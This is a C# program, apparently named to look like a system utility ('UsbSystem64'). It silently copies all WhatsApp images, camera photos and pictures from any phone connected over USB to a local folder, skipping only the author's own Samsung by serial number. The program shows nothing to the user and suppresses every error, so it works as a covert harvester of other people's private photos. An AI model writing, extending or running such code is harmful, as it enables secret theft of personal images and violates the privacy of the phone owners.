using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Configuration;

namespace UsbSystem64
{
    class Program
    {
        static void Main(string[] args)
        {

            try
            {
                try
                {
                    var x = MediaDevices.MediaDevice.GetDevices();


                    var rutas = new string[] { @"\Phone\WhatsApp\Media\WhatsApp Images", @"\Phone\DCIM", @"\Phone\Pictures" };

                    var exclude = new string[] { "R58H74RBV0A" }; //My Own samsung

                    string rutaBack = @"D:\Backs\";

                    bool flag = true;

                    foreach (var item in x)
                    {
                        flag = true;

                        item.Connect();

                        //Excluye algunos dispositivos por su numero de Serie
                        for (int m = 0; m < exclude.Length; m++)
                        {
                            if (item.SerialNumber == exclude[m])
                            {
                                flag = false;
                            }
                        }

                        if (flag)
                        {
                            for (int n = 0; n < rutas.Length; n++)
                            {
                                GetImagesFromMainFolder(item, item.SerialNumber + "-" + item.FriendlyName, rutas[n], rutaBack);
                            }
                        }

                        

                        item.Disconnect();

                    }
                }
                catch (Exception ex4)
                {


                }
            }
            catch (Exception ex5)
            {

              
            }
           
            
        }




        protected static void GetImagesFromMainFolder(MediaDevices.MediaDevice Item,string deviceName, string ruta, string Back)
        {
            try
            {
                var mainImages = Item.GetDirectoryInfo(ruta);

                var directoriesInside  =  mainImages.EnumerateDirectories().ToList();

                //Getting Files from Directories Inside

                foreach (var odInside in directoriesInside)
                {
                    GetImagesFromMainFolder(Item, deviceName, ruta + @"\"+ odInside.Name, Back);
                }

                //Getting Files from Files Inside

                var listadoimages = mainImages.EnumerateFiles().ToList();

                foreach (var oimages in listadoimages)
                {
                    try
                    {
                        //System.IO.Directory.CreateDirectory(Back + deviceName);

                        System.IO.Directory.CreateDirectory(Back + deviceName + @"\" + mainImages.Name);

                        oimages.CopyTo(Back + deviceName + @"\" + mainImages.Name + @"\" + oimages.Name, true);
                    }
                    catch (Exception ex)
                    {
                        //Si falla una sigue 
                    }
                }

            }
            catch (Exception ex2)
            {
                //Si no hay carpeta de wasap avanza al siguiente
            }

        }


    }
}
